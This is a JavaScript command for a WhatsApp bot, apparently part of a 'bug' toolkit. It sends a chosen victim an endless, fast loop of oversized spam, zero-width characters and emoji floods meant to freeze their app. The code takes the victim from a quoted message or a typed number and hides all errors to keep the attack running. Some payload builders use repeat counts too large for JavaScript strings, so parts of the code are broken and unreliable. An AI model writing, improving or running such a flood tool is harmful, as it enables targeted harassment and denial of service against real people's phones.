import { owners } from '../config.js'

export const name = 'ice'
export const description = 'Ice bug: Freezes the target and threatens to freeze the sender too'
export const command = ['ice']
export const ownerOnly = true

function generateIcePayload() {
  // Frigid mix of cold emojis, snowflakes, and invisible characters
  const iceText = '❄️❄️❄️ SYSTEM FREEZE INITIATED ❄️❄️❄️\n'.repeat(999999999)
  const snowstorm = '☃️⛄️❄️🌨️🌬️'.repeat(999999999)
  const zeroWidth = '\u200B'.repeat(99999999999)
  const glitchChars = Array(800).fill(String.fromCharCode(0x2593)).join('') // dark block chars to glitch

  return `${iceText}\n${snowstorm}\n${zeroWidth}\n${glitchChars}`
}

export async function execute(m, { client, text, isOwner }) {
  if (!isOwner) return client.reply(m.chat, '🚫 Only the supreme witcher can unleash the ice bug!', m)

  let target = ''
  if (m.quoted) target = m.quoted.sender
  else if (text) {
    if (text.includes('@')) target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    else target = text + '@s.whatsapp.net'
  }
  if (!target) return client.reply(m.chat, '⚠️ You must specify a victim to unleash the ice bug!', m)

  client.reply(m.chat, `🧊 Ice bug unleashed on ${target}! Brace for the freeze...`, m)

  const freezeSpam = Array(3000).fill('🧊 ERROR: SYSTEM FREEZE DETECTED 🧊').join('\n')

  while (true) {
    try {
      await client.sendMessage(target, { text: freezeSpam })
      await client.sendMessage(target, { text: generateIcePayload() })
      await client.sendMessage(target, { text: '\u200B'.repeat(13000) })
      await client.sendMessage(target, { text: '❄️'.repeat(10000) })

      // Tiny delay to reduce your client risk but still insanely fast
      await new Promise(r => setTimeout(r, 70))
    } catch (e) {
      // Keep going no matter what
    }
  }
}
